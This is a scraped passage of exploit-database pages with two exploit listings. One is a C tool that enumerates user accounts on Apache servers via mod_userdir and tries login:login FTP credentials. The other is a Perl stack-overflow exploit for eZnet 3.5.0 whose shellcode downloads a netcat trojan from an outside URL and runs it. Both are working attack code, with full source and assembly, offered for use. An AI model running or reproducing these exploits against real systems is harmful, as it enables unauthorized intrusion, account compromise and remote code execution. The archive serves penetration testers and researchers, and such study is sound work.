'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 132
Apache 1.3.x < 2.0.48 mod_userdir - Remote Users Disclosure - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache 1.3.x < 2.0.48 mod_userdir - Remote Users DisclosureEDB-ID:132CVE:EDB Verified:Author:m00Type:remoteExploit:/Platform:LinuxDate:2003-12-06Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* m00-apache-w00t.c** Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.* ~ Proof-of-Concept edition ~** This tool scans remote hosts with httpd (apache) and disclosure information* about existens users accounts via wrong default configuration of mod_userdir* (default apache module). Then attempts to log on ftp with found logins.** Works only against Linux and *BSD boxes.* Info: http://archives.neohapsis.com/archives/vuln-dev/2000-q3/0065.html* This is old, but curentlly still actual problem, because 99% of all admins use* default configuration of apache http server.** This tool scans remote hosts with httpd (apache) and disclosure information* about existens users accounts via wrong default configuration of mod_userdir* (default apache module). Then attempts to log on ftp with found logins.** -d4rkgr3y** sh-2.05b$ ./m00-apache-w00t -t localhost -u test_userlist.txt -b** [*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.** [*] Checking http server [localhost:80]...* Apache => yes* Vulnerable => yes* OS => Mandrake Linux* [*] Searching for system accounts...* sergey =>* m00 =>* satan => yes* evil =>* poison =>* god =>* guest =>* dima =>* ftp => yes* vasya =>* rst =>* vasi =>* [*] Searching complete.* 12 users checked* 2 users found* [*] Attempting to log on ftp with login:login...* satan:satan => no* ftp:ftp => no* [*] Complete.* 0 ftp accounts found**/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <sys/socket.h>#include <sys/types.h>#include <netinet/in.h>#include <netdb.h>#define DEFAULT_HTTP_PORT 80#define DEFAULT_FTP_PORT 21int m00() {printf("\n[*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.\n\n");printf("\n[*] Downloaded on www.K-OTIK.com\n\n");}int verbose(char *d) {printf("+-----------------------o0o-----------------------+\n");printf("\n%s",d);printf("+-----------------------o0o-----------------------+\n");}int usage(char *xplname) {printf("[~] usage: %s -t <host> -u <userlist> [options]\n\n",xplname);printf("Options:\n");printf("-p <port> - http port [80]\n");printf("-l <log_file> - log all attempts to file\n");printf("-b - try to log on ftp with guessed logins (public version only login:login)\n");printf("-h - usage\n");printf("\n");exit(0);}int attempt(char *argv);int conn(char *ip, unsigned short port) {struct hostent *hs;struct sockaddr_in sock;int sockfd;bzero(&sock, sizeof(sock));sock.sin_family = AF_INET;sock.sin_port = htons(port);if ((sock.sin_addr.s_addr=inet_addr(ip))==-1) {if ((hs=gethostbyname(ip))==NULL) {perror("[-] Error"); exit(0);}sock.sin_family = hs->h_addrtype;memcpy((caddr_t)&sock.sin_addr.s_addr,hs->h_addr,hs->h_length);}if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){perror("[-] Error"); exit(0);}if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0){perror("[-] Error "); exit(0);}return(sockfd);}int main(int argc, char *argv[]) {FILE *userlist, *logfile;char *file=NULL;char *lfile=NULL;char *host=NULL;char buf[0x20], check[0x20], request[0xc8], answer[0x3e8], c,logd[0x30];int i,hand,x,f,v=0,brute=0;int port = DEFAULT_HTTP_PORT;int fport = DEFAULT_FTP_PORT;char c200[0x05] ="\x20\x32\x30\x30\x20";char c403[0x0e] ="\x34\x30\x33\x20\x46\x6f""\x72\x62\x69\x64\x64\x65\x6e";char c404[0x0e] ="\x34\x30\x34\x20\x4e\x6f\x74""\x20\x46\x6f\x75\x6e\x64";char signature[0x0f] ="\x53\x65\x72\x76\x65\x72\x3a""\x20\x41\x70\x61\x63\x68\x65";char *http ="Accept: */*\r\n""Accept-Language: en-us,en;q=0.5\r\n""Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n""User-Agent: m00-apache-finger\r\n""Connection: close\r\n\r\n";char **logz;m00();if(argc<2) usage(argv[0]);while((c = getopt(argc, argv, "t:u:hp:vbl:"))!= EOF) {switch (c) {case 't':host=optarg;break;case 'u':file=optarg;break;case 'p':port=atoi(optarg);break;case 'l':lfile=optarg;break;case 'b':brute=1;break;case 'v':v=1;break;case 'h':usage(argv[0]);return 1;default:usage(argv[0]);return 1;}}if(host==NULL) { usage(argv[0]); }if(file==NULL) { usage(argv[0]); }if(lfile && (logfile = fopen(lfile, "a")) == 0) {printf("[-] unable to open logfile [%s]\n",lfile);exit(0);}if((userlist = fopen(file, "r")) == 0) {printf("[-] unable to open userlist [%s]\n",file);exit(0);}logz = (char **)malloc(0x666);printf("[*] Checking http server [%s:%i]...\n",host,port);hand = conn(host,port);sprintf(request,"HEAD /~root HTTP/1.1\r\nHost: %s\r\n%s",host,http);write(hand,request,strlen(request));recv(hand,answer,0x3e8,0);if(v) verbose(answer);printf(" Apache => ");if(!strstr(answer,signature)) { printf(" no\n Vulnerable => "); } else printf(" yes\n Vulnerable => ");if(!strstr(answer,c403)) { printf("no\n[-] Exiting...\n"); exit(0); } else printf("yes\n");close(hand);hand = conn(host,port);sprintf(request,"HEAD /~toor HTTP/1.1\r\nHost: %s\r\n%s",host,http);write(hand,request,strlen(request));recv(hand,answer,0x3e8,0);if(v) verbose(answer);printf(" OS => ");if(strstr(answer,c403)) { printf("FreeBSD"); } else {if(strstr(answer,"Unix")) printf("Unix unknow");if(strstr(answer,"Debian")) printf("Debian Linux");if(strstr(answer,"RedHat")) printf("RedHat Linux");if(strstr(answer,"mdk")) printf("Mandrake Linux");}close(hand);printf("\n[*] Searching for system accounts...");if(lfile) {sprintf(logd,"Host: %s\nFound accounts:\n",host);fprintf(logfile,logd);}x=0;f=0;while (1) {fgets(buf, 32, userlist);if (buf[0] == '\n' || strstr(check,buf)) break;strcpy(check,buf);buf[strlen(buf)-1] = '\0';x++;printf("\n %s \t=> ",buf);hand = conn(host,port);sprintf(request,"HEAD /~%s HTTP/1.1\r\nHost: %s\r\n%s",buf,host,http);write(hand,request,strlen(request));recv(hand,answer,0x3e8,0);if(v) verbose(answer);if(!strstr(answer,c404)) {printf(" yes",buf);if(lfile) {sprintf(logd,"%s\n",buf);fprintf(logfile,logd);}logz[f] = (char *)malloc(strlen(buf));memcpy(logz[f],buf,strlen(buf));memset(logz[f]+strlen(buf),0x0,1);f++;}close(hand);}fclose(userlist);printf("\n[*] Searching complete.\n");printf(" %i users checked\n %i users found\n",x,f);if(brute && f>0) {x=0;i=0;if(lfile) {sprintf(logd,"FTP:\n");fprintf(logfile,logd);}printf("[*] Attempting to log on ftp with login:login...\n");while(x!=f) {printf(" %s:%s \t=>",logz[x],logz[x]);hand = conn(host,fport);sprintf(request,"USER %s\n",logz[x]);write(hand,request,strlen(request));recv(hand,answer,0x3e8,0);sprintf(request,"PASS %s\n",logz[x]);write(hand,request,strlen(request));recv(hand,answer,0x3e8,0);if(strstr(answer,"230")) {printf(" yes\n");if(lfile) {sprintf(logd,"%s:%s\n",logz[x],logz[x]);fprintf(logfile,logd);}i++;} else printf(" no\n");close(hand);x++;}printf("[*] Complete.\n");printf(" %i ftp accounts found\n",i);}if(lfile) {fprintf(logfile,"\n");fclose(logfile);}}/* m00 */// milw0rm.com [2003-12-06]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 133
Eznet 3.5.0 - Remote Stack Overflow / Denial of Service - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDEznet 3.5.0 - Remote Stack Overflow / Denial of ServiceEDB-ID:133CVE:2003-1339EDB Verified:Author:Peter Winter-SmithType:remoteExploit:/Platform:WindowsDate:2003-12-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -w## Stack Overflow in eZnet.exe - Remote Exploit## Will download a trojan from any address which you provide# on the target system, then will execute the trojan.## For this exploit I have tried several strategies to increase# reliability and performance:## + Jump to a static 'call esp'# + Backwards jump to code a known distance from the stack pointer#    since the stack address seems to change for each version of#    eznet.# + Works out the byte difference for custom urls#    (must be no longer than 254 bytes!!)# + Causes eznet.exe to restart (not really my choice ;o)# + Shellcode steals addresses from a static module.## (Shellcode is attached to the bottom of this file!)## - by Peter Winter-Smith [peter4020@hotmail.com]use IO::Socket;if(!($ARGV[1])){print "\nUsage: eZnetexploit.pl <victim> <url of trojan>\n" ." + netcat trojan at http://www.elitehaven.net/ncat.exe\n" ." + listens on port 9999.\n\n";exit;}print "eZnet.exe remote trojan downloader exploit\n";$victim = IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ARGV[0],PeerPort=>"80")or die "Unable to connect to $ARGV[0] on port 80";$tlen = chr(length($ARGV[1]) + 1);$shellcode =            "\xEB\x3C\x5F\x55\x89\xE5\x81\xC4" ."\xE8\xFF\xFF\xFF\x57\x31\xDB\xB3" ."\x07\xB0\xFF\xFC\xF2\xAE\xFE\x47" ."\xFF\xFE\xCB\x80\xFB\x01\x75\xF4" ."\x5F\x57\x8D\x7F\x0B\x57\x8D\x7F" ."\x13\x57\x8D\x7F\x08\x57\x8D\x7F" .$tlen  ."\x57\x8D\x7F\x09\x47\x57\x8D" ."\x54\x24\x14\x52\xEB\x02\xEB\x52" ."\x89\xD6\xFF\x36\xFF\x15\x1C\x91" ."\x04\x10\x5A\x52\x8D\x72\xFC\xFF" ."\x36\x50\xFF\x15\xCC\x90\x04\x10" ."\x5A\x52\x31\xC9\x51\x51\x8D\x72" ."\xF0\xFF\x36\x8D\x72\xF4\xFF\x36" ."\x51\xFF\xD0\x5A\x52\xFF\x72\xEC" ."\xFF\x15\x1C\x91\x04\x10\x5A\x52" ."\x8D\x72\xF8\xFF\x36\x50\xFF\x15" ."\xCC\x90\x04\x10\x5A\x52\x31\xC9" ."\x41\x51\x8D\x72\xF0\xFF\x36\xFF" ."\xD0\xCC\xE8\x6B\xFF\xFF\xFF\x55" ."\x52\x4C\x4D\x4F\x4E\x2E\x44\x4C" ."\x4C\xFF\x55\x52\x4C\x44\x6F\x77" ."\x6E\x6C\x6F\x61\x64\x54\x6F\x46" ."\x69\x6C\x65\x41\xFF\x57\x69\x6E" ."\x45\x78\x65\x63\xFF" .  $ARGV[1] ."\xFF" ."\x63\x3A\x5C\x6E\x63\x2E\x65\x78" ."\x65\xFF\x6B\x65\x72\x6E\x65\x6C" ."\x33\x32\x2E\x64\x6C\x6C\xFF";$jmpcode =              "\x89\xE0\x66\x2D\x38\x32\xFF\xE0";$eip = "\xBB\x33\x05\x10";$packet = "" ."GET /SwEzModule.dll?operation=login&autologin=" ."\x90"x65 . $shellcode . "a"x(4375 - length($ARGV[1])) . $eip . "\x90"x20 . $jmpcode ."\x20HTTP/1.0.User-Agent: SoftwaxAsys/2.1.10\n\n";print $victim $packet;print " + Making Request ...\n + Trojan should download - best of luck!\n";sleep(4);close($victim);print "Done.\n";exit;#-----------------------------[vampiric.asm]------------------------------# ; 'eZnet.exe' (eZmeeting, eZnetwork, eZphotoshare, eZshare, eZ)# ;   (cryptso.dll vampiric shellcode)# ; Url Download + Execute# ; By Peter Winter-Smith# ; [peter4020@hotmail.com]## bits 32## jmp short killnull## next:# pop edi## push ebp# mov ebp, esp# add esp, -24## push edi## xor ebx, ebx# mov bl, 07h# mov al, 0ffh## cld# nullify:# repne scasb# inc byte [edi-01h]# dec bl# cmp bl, 01h# jne nullify## pop edi## push edi		; 'URLMON.DLL'# lea edi, [edi+11]# push edi		; 'URLDownloadToFileA'# lea edi, [edi+19]# push edi		; 'WinExec'# lea edi, [edi+08]# push edi		; 'http://www.elitehaven.net/ncat.exe'# lea edi, [edi+35]# push edi		; 'c:\nc.exe'# lea edi, [edi+09]# inc edi# push edi		; 'kernel32.dll'## lea edx, [esp+20]# push edx## jmp short over# killnull:# jmp short data# over:## mov esi, edx# push dword [esi]## call [1004911ch]	; LoadLibraryA## pop edx# push edx# lea esi, [edx-04]# push dword [esi]## push eax## call [100490cch]	; GetProcAddress("URLMON.DLL", URLDownloadToFileA);## pop edx# push edx## xor ecx, ecx# push ecx# push ecx# lea esi, [edx-16]	; file path# push dword [esi]# lea esi, [edx-12]	; url# push dword [esi]# push ecx## call eax## pop edx# push edx## push dword [edx-20]## call [1004911ch]	; LoadLibraryA## pop edx# push edx### lea esi, [edx-08]# push dword [esi]	; 'WinExec'# push eax		; kernel32.dll handle## call [100490cch]	; GetProcAddress("kernel32.dll", WinExec);## pop edx# push edx## xor ecx, ecx# inc ecx# push ecx## lea esi, [edx-16]	; file path# push dword [esi]## call eax## int3## ta:# call next# db 'URLMON.DLL',0ffh# db 'URLDownloadToFileA',0ffh# db 'WinExec',0ffh# db 'http://www.elitehaven.net/ncat.exe',0ffh# ; When altering, you MUST be sure# ; to also alter the offsets in the 0ffh to null# ; byte search!# ; for example:# ;   db 'http://www.site.com/someguy/trojan.exe',0ffh# ; count the length of the url, and add one for the 0ffh byte.# ; The above url is 38 bytes long, plus one for our null, is 39 bytes.# ; find the code saying (at the start of the shellcode):# ;   push edi		; 'http://www.elitehaven.net/ncat.exe'# ;   lea edi, [edi+35]# ; and make it:# ;   push edi		; 'http://www.site.com/someguy/trojan.exe'# ;   lea edi, [edi+39]# ; same goes for the filename below :o)# db 'c:\nc.exe',0ffh# db 'kernel32.dll',0ffh#-------------------------------------------------------------------------#------------------------------[subcode.asm]------------------------------# ; eZnet.exe Sub-Shellcode# ; [peter4020@hotmail.com]## ;100533BBh## bits 32## mov eax, esp# sub ax, 3238h# jmp eax#-----------------------------------------------# milw0rm.com [2003-12-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== 